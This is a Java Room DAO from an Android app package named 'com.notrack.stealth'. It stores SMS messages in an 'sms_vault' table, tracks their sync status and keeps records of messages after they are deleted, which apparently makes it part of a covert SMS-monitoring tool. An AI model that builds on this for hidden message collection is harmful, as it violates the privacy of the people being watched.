package com.notrack.stealth.db;

import androidx.room.Dao;
import androidx.room.Insert;
import androidx.room.OnConflictStrategy;
import androidx.room.Query;
import androidx.room.Update;

import java.util.List;

@Dao
public interface SmsDao {

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    long insert(SmsEntity entity);

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    List<Long> insertAll(List<SmsEntity> entities);

    @Update
    void update(SmsEntity entity);

    @Query("SELECT * FROM sms_vault WHERE sync_status = 0 ORDER BY timestamp DESC LIMIT :limit")
    List<SmsEntity> getUnsyncedSms(int limit);

    @Query("UPDATE sms_vault SET sync_status = 1 WHERE id IN (:ids)")
    void markAsSynced(List<Long> ids);

    @Query("SELECT sms_id FROM sms_vault WHERE is_deleted = 0")
    List<String> getActiveSmsIds();

    @Query("UPDATE sms_vault SET is_deleted = 1, deleted_at = :deletedAt, sync_status = 0 WHERE sms_id IN (:deletedIds)")
    void markSmsAsDeleted(List<String> deletedIds, long deletedAt);

    @Query("SELECT COUNT(*) FROM sms_vault WHERE sms_id = :smsId LIMIT 1")
    int exists(String smsId);

    @Query("SELECT * FROM sms_vault ORDER BY timestamp DESC LIMIT :limit")
    List<SmsEntity> getRecentSms(int limit);
}
